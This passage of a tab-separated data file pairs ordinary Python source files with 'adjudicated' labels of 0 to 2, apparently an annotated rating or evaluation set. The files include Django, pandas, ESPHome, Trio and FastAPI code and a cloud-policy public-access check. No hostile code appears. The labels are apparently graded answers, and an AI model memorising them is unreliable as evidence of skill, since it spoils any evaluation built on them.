""*"" in statement[""Principal""][""AWS""]<<NEWL>>                            )<<NEWL>>                            or (<<NEWL>>                                ""CanonicalUser"" in statement[""Principal""]<<NEWL>>                                and ""*"" in statement[""Principal""][""CanonicalUser""]<<NEWL>>                            )<<NEWL>>                        ):<<NEWL>>                            if ""Condition"" not in statement:<<NEWL>>                                report.status = ""FAIL""<<NEWL>>                                report.status_extended = (<<NEWL>>                                    f""SNS topic {topic.name} policy with public access""<<NEWL>>                                )<<NEWL>>                            else:<<NEWL>>                                report.status = ""FAIL""<<NEWL>>                                report.status_extended = f""SNS topic {topic.name} policy with public access but has a Condition""<<NEWL>><<NEWL>>            findings.append(report)<<NEWL>><<NEWL>>        return findings"
53	adjudicated	0	"import esphome.codegen as cg<<NEWL>>import esphome.config_validation as cv<<NEWL>><<NEWL>>from esphome.components import binary_sensor, display<<NEWL>>from esphome.const import CONF_PAGE_ID<<NEWL>><<NEWL>>from .. import touchscreen_ns, CONF_TOUCHSCREEN_ID, Touchscreen, TouchListener<<NEWL>><<NEWL>>DEPENDENCIES = [""touchscreen""]<<NEWL>><<NEWL>>TouchscreenBinarySensor = touchscreen_ns.class_(<<NEWL>>    ""TouchscreenBinarySensor"",<<NEWL>>    binary_sensor.BinarySensor,<<NEWL>>    cg.Component,<<NEWL>>    TouchListener,<<NEWL>>    cg.Parented.template(Touchscreen),<<NEWL>>)<<NEWL>><<NEWL>>CONF_X_MIN = ""x_min""<<NEWL>>CONF_X_MAX = ""x_max""<<NEWL>>CONF_Y_MIN = ""y_min""<<NEWL>>CONF_Y_MAX = ""y_max""<<NEWL>><<NEWL>><<NEWL>>def validate_coords(config):<<NEWL>>    if (<<NEWL>>        config[CONF_X_MAX] < config[CONF_X_MIN]<<NEWL>>        or config[CONF_Y_MAX] < config[CONF_Y_MIN]<<NEWL>>    ):<<NEWL>>        raise cv.Invalid(<<NEWL>>            f""{CONF_X_MAX} is less than {CONF_X_MIN} or {CONF_Y_MAX} is less than {CONF_Y_MIN}""<<NEWL>>        )<<NEWL>>    return config<<NEWL>><<NEWL>><<NEWL>>CONFIG_SCHEMA = cv.All(<<NEWL>>    binary_sensor.binary_sensor_schema(TouchscreenBinarySensor)<<NEWL>>    .extend(<<NEWL>>        {<<NEWL>>            cv.GenerateID(CONF_TOUCHSCREEN_ID): cv.use_id(Touchscreen),<<NEWL>>            cv.Required(CONF_X_MIN): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Required(CONF_X_MAX): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Required(CONF_Y_MIN): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Required(CONF_Y_MAX): cv.int_range(min=0, max=2000),<<NEWL>>            cv.Optional(CONF_PAGE_ID): cv.use_id(display.DisplayPage),<<NEWL>>        }<<NEWL>>    )<<NEWL>>    .extend(cv.COMPONENT_SCHEMA),<<NEWL>>    validate_coords,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>async def to_code(config):<<NEWL>>    var = await binary_sensor.new_binary_sensor(config)<<NEWL>>    await cg.register_component(var, config)<<NEWL>>    await cg.register_parented(var, config[CONF_TOUCHSCREEN_ID])<<NEWL>><<NEWL>>    cg.add(<<NEWL>>        var.set_area(<<NEWL>>            config[CONF_X_MIN],<<NEWL>>            config[CONF_X_MAX],<<NEWL>>            config[CONF_Y_MIN],<<NEWL>>            config[CONF_Y_MAX],<<NEWL>>        )<<NEWL>>    )<<NEWL>><<NEWL>>    if CONF_PAGE_ID in config:<<NEWL>>        page = await cg.get_variable(config[CONF_PAGE_ID])<<NEWL>>        cg.add(var.set_page(page))"
282	adjudicated	0	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>from google.cloud.automl_v1beta1 import Model<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import automl_tables_model<<NEWL>>import automl_tables_predict<<NEWL>>import model_test<<NEWL>><<NEWL>><<NEWL>>PROJECT = os.environ[""GOOGLE_CLOUD_PROJECT""]<<NEWL>>REGION = ""us-central1""<<NEWL>>STATIC_MODEL = model_test.STATIC_MODEL<<NEWL>>GCS_INPUT = ""gs://{}-automl-tables-test/bank-marketing.csv"".format(PROJECT)<<NEWL>>GCS_OUTPUT = ""gs://{}-automl-tables-test/TABLE_TEST_OUTPUT/"".format(PROJECT)<<NEWL>>BQ_INPUT = ""bq://{}.automl_test.bank_marketing"".format(PROJECT)<<NEWL>>BQ_OUTPUT = ""bq://{}"".format(PROJECT)<<NEWL>>PARAMS = {}<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.slow<<NEWL>>def test_batch_predict(capsys):<<NEWL>>    ensure_model_online()<<NEWL>><<NEWL>>    automl_tables_predict.batch_predict(<<NEWL>>        PROJECT, REGION, STATIC_MODEL, GCS_INPUT, GCS_OUTPUT, PARAMS<<NEWL>>    )<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert ""Batch prediction complete"" in out<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.slow<<NEWL>>def test_batch_predict_bq(capsys):<<NEWL>>    ensure_model_online()<<NEWL>>    automl_tables_predict.batch_predict_bq(<<NEWL>>        PROJECT, REGION, STATIC_MODEL, BQ_INPUT, BQ_OUTPUT, PARAMS<<NEWL>>    )<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert ""Batch prediction complete"" in out<<NEWL>><<NEWL>><<NEWL>>def ensure_model_online():<<NEWL>>    model = model_test.ensure_model_ready()<<NEWL>>    if model.deployment_state != Model.DeploymentState.DEPLOYED:<<NEWL>>        automl_tables_model.deploy_model(PROJECT, REGION, model.display_name)<<NEWL>><<NEWL>>    return automl_tables_model.get_model(PROJECT, REGION, model.display_name)"
113	adjudicated	2	"""""""<<NEWL>>This module includes some utility functions for inspecting the layout<<NEWL>>of a GDAL data source -- the functionality is analogous to the output<<NEWL>>produced by the `ogrinfo` utility.<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib.gis.gdal import DataSource<<NEWL>>from django.contrib.gis.gdal.geometries import GEO_CLASSES<<NEWL>><<NEWL>><<NEWL>>def ogrinfo(data_source, num_features=10):<<NEWL>>    """"""<<NEWL>>    Walk the available layers in the supplied `data_source`, displaying<<NEWL>>    the fields for the first `num_features` features.<<NEWL>>    """"""<<NEWL>><<NEWL>>    # Checking the parameters.<<NEWL>>    if isinstance(data_source, str):<<NEWL>>        data_source = DataSource(data_source)<<NEWL>>    elif isinstance(data_source, DataSource):<<NEWL>>        pass<<NEWL>>    else:<<NEWL>>        raise Exception(<<NEWL>>            ""Data source parameter must be a string or a DataSource object.""<<NEWL>>        )<<NEWL>><<NEWL>>    for i, layer in enumerate(data_source):<<NEWL>>        print(""data source : %s"" % data_source.name)<<NEWL>>        print(""==== layer %s"" % i)<<NEWL>>        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)<<NEWL>>        print(""  # features: %s"" % len(layer))<<NEWL>>        print(""         srs: %s"" % layer.srs)<<NEWL>>        extent_tup = layer.extent.tuple<<NEWL>>        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))<<NEWL>>        print(""Displaying the first %s features ===="" % num_features)<<NEWL>><<NEWL>>        width = max(*map(len, layer.fields))<<NEWL>>        fmt = "" %%%ss: %%s"" % width<<NEWL>>        for j, feature in enumerate(layer[:num_features]):<<NEWL>>            print(""=== Feature %s"" % j)<<NEWL>>            for fld_name in layer.fields:<<NEWL>>                type_name = feature[fld_name].type_name<<NEWL>>                output = fmt % (fld_name, type_name)<<NEWL>>                val = feature.get(fld_name)<<NEWL>>                if val:<<NEWL>>                    if isinstance(val, str):<<NEWL>>                        val_fmt = ' (""%s"")'<<NEWL>>                    else:<<NEWL>>                        val_fmt = "" (%s)""<<NEWL>>                    output += val_fmt % val<<NEWL>>                else:<<NEWL>>                    output += "" (None)""<<NEWL>>                print(output)"
214	adjudicated	0	"import datetime<<NEWL>><<NEWL>>import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    DataFrame,<<NEWL>>    Series,<<NEWL>>    _testing as tm,<<NEWL>>)<<NEWL>>from pandas.tests.io.pytables.common import ensure_clean_store<<NEWL>><<NEWL>>pytestmark = pytest.mark.single_cpu<<NEWL>><<NEWL>><<NEWL>>def test_store_datetime_fractional_secs(setup_path):<<NEWL>><<NEWL>>    with ensure_clean_store(setup_path) as store:<<NEWL>>        dt = datetime.datetime(2012, 1, 2, 3, 4, 5, 123456)<<NEWL>>        series = Series([0], [dt])<<NEWL>>        store[""a""] = series<<NEWL>>        assert store[""a""].index[0] == dt<<NEWL>><<NEWL>><<NEWL>>def test_tseries_indices_series(setup_path):<<NEWL>><<NEWL>>    with ensure_clean_store(setup_path) as store:<<NEWL>>        idx = tm.makeDateIndex(10)<<NEWL>>        ser = Series(np.random.randn(len(idx)), idx)<<NEWL>>        store[""a""] = ser<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_series_equal(result, ser)<<NEWL>>        assert result.index.freq == ser.index.freq<<NEWL>>        tm.assert_class_equal(result.index, ser.index, obj=""series index"")<<NEWL>><<NEWL>>        idx = tm.makePeriodIndex(10)<<NEWL>>        ser = Series(np.random.randn(len(idx)), idx)<<NEWL>>        store[""a""] = ser<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_series_equal(result, ser)<<NEWL>>        assert result.index.freq == ser.index.freq<<NEWL>>        tm.assert_class_equal(result.index, ser.index, obj=""series index"")<<NEWL>><<NEWL>><<NEWL>>def test_tseries_indices_frame(setup_path):<<NEWL>><<NEWL>>    with ensure_clean_store(setup_path) as store:<<NEWL>>        idx = tm.makeDateIndex(10)<<NEWL>>        df = DataFrame(np.random.randn(len(idx), 3), index=idx)<<NEWL>>        store[""a""] = df<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_frame_equal(result, df)<<NEWL>>        assert result.index.freq == df.index.freq<<NEWL>>        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")<<NEWL>><<NEWL>>        idx = tm.makePeriodIndex(10)<<NEWL>>        df = DataFrame(np.random.randn(len(idx), 3), idx)<<NEWL>>        store[""a""] = df<<NEWL>>        result = store[""a""]<<NEWL>><<NEWL>>        tm.assert_frame_equal(result, df)<<NEWL>>        assert result.index.freq == df.index.freq<<NEWL>>        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")"
185	adjudicated	0	"#!/usr/bin/python3<<NEWL>># -*- coding: utf-8 -*-<<NEWL>>#<<NEWL>>#    Copyright (C) 2022 by YOUR NAME HERE<<NEWL>>#<<NEWL>>#    This file is part of RoboComp<<NEWL>>#<<NEWL>>#    RoboComp is free software: you can redistribute it and/or modify<<NEWL>>#    it under the terms of the GNU General Public License as published by<<NEWL>>#    the Free Software Foundation, either version 3 of the License, or<<NEWL>>#    (at your option) any later version.<<NEWL>>#<<NEWL>>#    RoboComp is distributed in the hope that it will be useful,<<NEWL>>#    but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>>#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<<NEWL>>#    GNU General Public License for more details.<<NEWL>>#<<NEWL>>#    You should have received a copy of the GNU General Public License<<NEWL>>#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.<<NEWL>><<NEWL>>import sys, Ice, os<<NEWL>>from PySide2 import QtWidgets, QtCore<<NEWL>><<NEWL>>ROBOCOMP = ''<<NEWL>>try:<<NEWL>>    ROBOCOMP = os.environ['ROBOCOMP']<<NEWL>>except KeyError:<<NEWL>>    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')<<NEWL>>    ROBOCOMP = '/opt/robocomp'<<NEWL>><<NEWL>>Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")<<NEWL>>import RoboCompCommonBehavior<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>class GenericWorker(QtCore.QObject):<<NEWL>><<NEWL>>    kill = QtCore.Signal()<<NEWL>><<NEWL>>    def __init__(self, mprx):<<NEWL>>        super(GenericWorker, self).__init__()<<NEWL>><<NEWL>>        self.people_proxy = mprx[""PeopleProxy""]<<NEWL>>        self.people1_proxy = mprx[""PeopleProxy1""]<<NEWL>>        self.peoplepub_proxy = mprx[""PeoplePub""]<<NEWL>><<NEWL>>        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)<<NEWL>>        self.Period = 30<<NEWL>>        self.timer = QtCore.QTimer(self)<<NEWL>><<NEWL>><<NEWL>>    @QtCore.Slot()<<NEWL>>    def killYourSelf(self):<<NEWL>>        rDebug(""Killing myself"")<<NEWL>>        self.kill.emit()<<NEWL>><<NEWL>>    # \brief Change compute period<<NEWL>>    # @param per Period in ms<<NEWL>>    @QtCore.Slot(int)<<NEWL>>    def setPeriod(self, p):<<NEWL>>        print(""Period changed"", p)<<NEWL>>        self.Period = p<<NEWL>>        self.timer.start(self.Period)"
354	adjudicated	1	"import builtins<<NEWL>>import logging<<NEWL>>import signal<<NEWL>>import threading<<NEWL>>import traceback<<NEWL>>import warnings<<NEWL>><<NEWL>>import trio<<NEWL>><<NEWL>><<NEWL>>class TrioRunner:<<NEWL>>    def __init__(self):<<NEWL>>        self._cell_cancel_scope = None<<NEWL>>        self._trio_token = None<<NEWL>><<NEWL>>    def initialize(self, kernel, io_loop):<<NEWL>>        kernel.shell.set_trio_runner(self)<<NEWL>>        kernel.shell.run_line_magic(""autoawait"", ""trio"")<<NEWL>>        kernel.shell.magics_manager.magics[""line""][""autoawait""] = lambda _: warnings.warn(<<NEWL>>            ""Autoawait isn't allowed in Trio background loop mode.""<<NEWL>>        )<<NEWL>>        bg_thread = threading.Thread(target=io_loop.start, daemon=True, name=""TornadoBackground"")<<NEWL>>        bg_thread.start()<<NEWL>><<NEWL>>    def interrupt(self, signum, frame):<<NEWL>>        if self._cell_cancel_scope:<<NEWL>>            self._cell_cancel_scope.cancel()<<NEWL>>        else:<<NEWL>>            raise Exception(""Kernel interrupted but no cell is running"")<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        old_sig = signal.signal(signal.SIGINT, self.interrupt)<<NEWL>><<NEWL>>        def log_nursery_exc(exc):<<NEWL>>            exc = ""\n"".join(traceback.format_exception(type(exc), exc, exc.__traceback__))<<NEWL>>            logging.error(""An exception occurred in a global nursery task.\n%s"", exc)<<NEWL>><<NEWL>>        async def trio_main():<<NEWL>>            self._trio_token = trio.lowlevel.current_trio_token()<<NEWL>>            async with trio.open_nursery() as nursery:<<NEWL>>                # TODO This hack prevents the nursery from cancelling all child<<NEWL>>                # tasks when an uncaught exception occurs, but it's ugly.<<NEWL>>                nursery._add_exc = log_nursery_exc<<NEWL>>                builtins.GLOBAL_NURSERY = nursery  # type:ignore[attr-defined]<<NEWL>>                await trio.sleep_forever()<<NEWL>><<NEWL>>        trio.run(trio_main)<<NEWL>>        signal.signal(signal.SIGINT, old_sig)<<NEWL>><<NEWL>>    def __call__(self, async_fn):<<NEWL>>        async def loc(coro):<<NEWL>>            self._cell_cancel_scope = trio.CancelScope()<<NEWL>>            with self._cell_cancel_scope:<<NEWL>>                return await coro<<NEWL>>            self._cell_cancel_scope = None<<NEWL>><<NEWL>>        return trio.from_thread.run(loc, async_fn, trio_token=self._trio_token)"
245	adjudicated	0	"from .models import OrderedDrug, Order<<NEWL>>from django.dispatch import receiver<<NEWL>>from django.db.models.signals import post_save, post_delete<<NEWL>>from notifications_app.tasks import create_notification, delete_notifications<<NEWL>>from django.db.transaction import on_commit<<NEWL>>from .tasks import set_drug_quantity<<NEWL>>from django.contrib.auth import get_user_model<<NEWL>><<NEWL>>User = get_user_model()<<NEWL>><<NEWL>><<NEWL>>@receiver(post_save, sender=OrderedDrug)<<NEWL>>def reduce_drug_quantity(instance, **kwargs):<<NEWL>>    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, -instance.quantity))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_delete, sender=OrderedDrug)<<NEWL>>def rollback_drug_quantity(instance, **kwargs):<<NEWL>>    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, instance.quantity))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_save, sender=Order)<<NEWL>>def send_creation_notif(instance, created, **kwargs):<<NEWL>>    if created:<<NEWL>>        admin = User.objects.get(is_staff=1)<<NEWL>>        data = {<<NEWL>>            ""sender_id"": instance.user.id,<<NEWL>>            ""receiver_id"": admin.id,<<NEWL>>            ""options"": {<<NEWL>>                ""message"": f""the user {instance.user.full_name} asks order"",<<NEWL>>                ""order_id"": instance.id,<<NEWL>>            },<<NEWL>>        }<<NEWL>>        on_commit(lambda: create_notification.delay(**data))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_save, sender=Order)<<NEWL>>def send_approving_notif(instance, **kwargs):<<NEWL>>    if instance.status == ""Completed"":<<NEWL>>        admin = User.objects.get(is_staff=1)<<NEWL>>        data = {<<NEWL>>            ""sender_id"": admin.id,<<NEWL>>            ""receiver_id"": instance.user.id,<<NEWL>>            ""options"": {<<NEWL>>                ""message"": f""the admin approve your order order"",<<NEWL>>                ""order_id"": instance.id,<<NEWL>>            },<<NEWL>>        }<<NEWL>>        on_commit(lambda: create_notification.delay(**data))<<NEWL>><<NEWL>><<NEWL>>@receiver(post_delete, sender=Order)<<NEWL>>def send_notification(instance, **kwargs):<<NEWL>>    on_commit(lambda: delete_notifications.delay(instance.id, ""order_id""))"
94	adjudicated	2	"from django.conf import settings<<NEWL>>from django.utils.translation import get_supported_language_variant<<NEWL>>from django.utils.translation.trans_real import language_code_re<<NEWL>><<NEWL>>from . import Error, Tags, register<<NEWL>><<NEWL>>E001 = Error(<<NEWL>>    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",<<NEWL>>    id=""translation.E001"",<<NEWL>>)<<NEWL>><<NEWL>>E002 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",<<NEWL>>    id=""translation.E002"",<<NEWL>>)<<NEWL>><<NEWL>>E003 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",<<NEWL>>    id=""translation.E003"",<<NEWL>>)<<NEWL>><<NEWL>>E004 = Error(<<NEWL>>    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""<<NEWL>>    ""the LANGUAGES setting."",<<NEWL>>    id=""translation.E004"",<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_language_code(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGE_CODE setting is invalid.""""""<<NEWL>>    tag = settings.LANGUAGE_CODE<<NEWL>>    if not isinstance(tag, str) or not language_code_re.match(tag):<<NEWL>>        return [Error(E001.msg.format(tag), id=E001.id)]<<NEWL>>    return []<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E002.msg.format(tag), id=E002.id)<<NEWL>>        for tag, _ in settings.LANGUAGES<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages_bidi(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES_BIDI setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E003.msg.format(tag), id=E003.id)<<NEWL>>        for tag in settings.LANGUAGES_BIDI<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_language_settings_consistent(app_configs, **kwargs):<<NEWL>>    """"""Error if language settings are not consistent with each other.""""""<<NEWL>>    try:<<NEWL>>        get_supported_language_variant(settings.LANGUAGE_CODE)<<NEWL>>    except LookupError:<<NEWL>>        return [E004]<<NEWL>>    else:<<NEWL>>        return []"
127	adjudicated	2	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>>from __future__ import absolute_import, division, print_function<<NEWL>><<NEWL>><<NEWL>>class InfinityType(object):<<NEWL>>    def __repr__(self):<<NEWL>>        # type: () -> str<<NEWL>>        return ""Infinity""<<NEWL>><<NEWL>>    def __hash__(self):<<NEWL>>        # type: () -> int<<NEWL>>        return hash(repr(self))<<NEWL>><<NEWL>>    def __lt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __le__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __eq__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return not isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __gt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __ge__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __neg__(self):<<NEWL>>        # type: (object) -> NegativeInfinityType<<NEWL>>        return NegativeInfinity<<NEWL>><<NEWL>><<NEWL>>Infinity = InfinityType()<<NEWL>><<NEWL>><<NEWL>>class NegativeInfinityType(object):<<NEWL>>    def __repr__(self):<<NEWL>>        # type: () -> str<<NEWL>>        return ""-Infinity""<<NEWL>><<NEWL>>    def __hash__(self):<<NEWL>>        # type: () -> int<<NEWL>>        return hash(repr(self))<<NEWL>><<NEWL>>    def __lt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __le__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return True<<NEWL>><<NEWL>>    def __eq__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return not isinstance(other, self.__class__)<<NEWL>><<NEWL>>    def __gt__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __ge__(self, other):<<NEWL>>        # type: (object) -> bool<<NEWL>>        return False<<NEWL>><<NEWL>>    def __neg__(self):<<NEWL>>        # type: (object) -> InfinityType<<NEWL>>        return Infinity<<NEWL>><<NEWL>><<NEWL>>NegativeInfinity = NegativeInfinityType()"
67	adjudicated	1	# Generated by Django 4.1.5 on 2023-03-07 04:49<<NEWL>><<NEWL>>from django.db import migrations, models<<NEWL>><<NEWL>><<NEWL>>class Migration(migrations.Migration):<<NEWL>><<NEWL>>    dependencies = [<<NEWL>>        ('rto', '0001_initial'),<<NEWL>>    ]<<NEWL>><<NEWL>>    operations = [<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Rules',<<NEWL>>            fields=[<<NEWL>>                ('rule_id', models.AutoField(primary_key=True, serialize=False)),<<NEWL>>                ('rule_code', models.CharField(max_length=50)),<<NEWL>>                ('rule_desc', models.CharField(blank=True, max_length=100)),<<NEWL>>                ('rule_sect', models.CharField(max_length=50, null=True)),<<NEWL>>                ('rule_pen', models.CharField(max_length=100, null=True)),<<NEWL>>            ],<<NEWL>>        ),<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Vehicle',<<NEWL>>            fields=[<<NEWL>>                ('vehicle_id', models.AutoField(primary_key=True, serialize=False)),<<NEWL>>                ('vehicle_no', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_own_name', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_own_contact', models.IntegerField(default=None)),<<NEWL>>                ('vehicle_own_add', models.CharField(default=None, max_length=100)),<<NEWL>>                ('vehicle_own_email', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_company_name', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_date_reg', models.DateField(default=None)),<<NEWL>>                ('vehicle_chassics_no', models.CharField(default=None, max_length=30)),<<NEWL>>                ('vehicle_eng_no', models.CharField(default=None, max_length=30)),<<NEWL>>                ('vehicle_own_srno', models.IntegerField(default=None)),<<NEWL>>                ('vehicle_fuel_use', models.CharField(default=None, max_length=30)),<<NEWL>>                ('vehicle_Seat_cap', models.IntegerField(default=None)),<<NEWL>>                ('vehicle_model_name', models.CharField(default=None, max_length=50)),<<NEWL>>                ('vehicle_created_date', models.DateField(auto_now_add=True)),<<NEWL>>                ('vehicle_last_login', models.CharField(default=None, max_length=30)),<<NEWL>>            ],<<NEWL>>        ),<<NEWL>>    ]
176	adjudicated	2	"import pytest<<NEWL>><<NEWL>>from pandas import TimedeltaIndex<<NEWL>><<NEWL>>from pandas.tseries.offsets import (<<NEWL>>    DateOffset,<<NEWL>>    Day,<<NEWL>>    Hour,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class TestFreq:<<NEWL>>    @pytest.mark.parametrize(""values"", [[""0 days"", ""2 days"", ""4 days""], []])<<NEWL>>    @pytest.mark.parametrize(""freq"", [""2D"", Day(2), ""48H"", Hour(48)])<<NEWL>>    def test_freq_setter(self, values, freq):<<NEWL>>        # GH#20678<<NEWL>>        idx = TimedeltaIndex(values)<<NEWL>><<NEWL>>        # can set to an offset, converting from string if necessary<<NEWL>>        idx._data.freq = freq<<NEWL>>        assert idx.freq == freq<<NEWL>>        assert isinstance(idx.freq, DateOffset)<<NEWL>><<NEWL>>        # can reset to None<<NEWL>>        idx._data.freq = None<<NEWL>>        assert idx.freq is None<<NEWL>><<NEWL>>    def test_freq_setter_errors(self):<<NEWL>>        # GH#20678<<NEWL>>        idx = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""])<<NEWL>><<NEWL>>        # setting with an incompatible freq<<NEWL>>        msg = (<<NEWL>>            ""Inferred frequency 2D from passed values does not conform to ""<<NEWL>>            ""passed frequency 5D""<<NEWL>>        )<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            idx._data.freq = ""5D""<<NEWL>><<NEWL>>        # setting with a non-fixed frequency<<NEWL>>        msg = r""<2 \* BusinessDays> is a non-fixed frequency""<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            idx._data.freq = ""2B""<<NEWL>><<NEWL>>        # setting with non-freq string<<NEWL>>        with pytest.raises(ValueError, match=""Invalid frequency""):<<NEWL>>            idx._data.freq = ""foo""<<NEWL>><<NEWL>>    def test_freq_view_safe(self):<<NEWL>>        # Setting the freq for one TimedeltaIndex shouldn't alter the freq<<NEWL>>        #  for another that views the same data<<NEWL>><<NEWL>>        tdi = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""], freq=""2D"")<<NEWL>>        tda = tdi._data<<NEWL>><<NEWL>>        tdi2 = TimedeltaIndex(tda)._with_freq(None)<<NEWL>>        assert tdi2.freq is None<<NEWL>><<NEWL>>        # Original was not altered<<NEWL>>        assert tdi.freq == ""2D""<<NEWL>>        assert tda.freq == ""2D"""
26	adjudicated	0	from typing import Optional<<NEWL>><<NEWL>>from fastapi import Depends, HTTPException, Path, Query<<NEWL>>from starlette import status<<NEWL>><<NEWL>>from app.api.dependencies.authentication import get_current_user_authorizer<<NEWL>>from app.api.dependencies.database import get_repository<<NEWL>>from app.db.errors import EntityDoesNotExist<<NEWL>>from app.db.repositories.items import ItemsRepository<<NEWL>>from app.models.domain.items import Item<<NEWL>>from app.models.domain.users import User<<NEWL>>from app.models.schemas.items import (<<NEWL>>    DEFAULT_ITEMS_LIMIT,<<NEWL>>    DEFAULT_ITEMS_OFFSET,<<NEWL>>    ItemsFilters,<<NEWL>>)<<NEWL>>from app.resources import strings<<NEWL>>from app.services.items import check_user_can_modify_item<<NEWL>><<NEWL>><<NEWL>>def get_items_filters(<<NEWL>>    tag: Optional[str] = None,<<NEWL>>    seller: Optional[str] = None,<<NEWL>>    favorited: Optional[str] = None,<<NEWL>>    limit: int = Query(DEFAULT_ITEMS_LIMIT, ge=1),<<NEWL>>    offset: int = Query(DEFAULT_ITEMS_OFFSET, ge=0),<<NEWL>>) -> ItemsFilters:<<NEWL>>    return ItemsFilters(<<NEWL>>        tag=tag,<<NEWL>>        seller=seller,<<NEWL>>        favorited=favorited,<<NEWL>>        limit=limit,<<NEWL>>        offset=offset,<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>async def get_item_by_slug_from_path(<<NEWL>>    slug: str = Path(..., min_length=1),<<NEWL>>    user: Optional[User] = Depends(get_current_user_authorizer(required=False)),<<NEWL>>    items_repo: ItemsRepository = Depends(get_repository(ItemsRepository)),<<NEWL>>) -> Item:<<NEWL>>    try:<<NEWL>>        return await items_repo.get_item_by_slug(slug=slug, requested_user=user)<<NEWL>>    except EntityDoesNotExist:<<NEWL>>        raise HTTPException(<<NEWL>>            status_code=status.HTTP_404_NOT_FOUND,<<NEWL>>            detail=strings.ITEM_DOES_NOT_EXIST_ERROR,<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>def 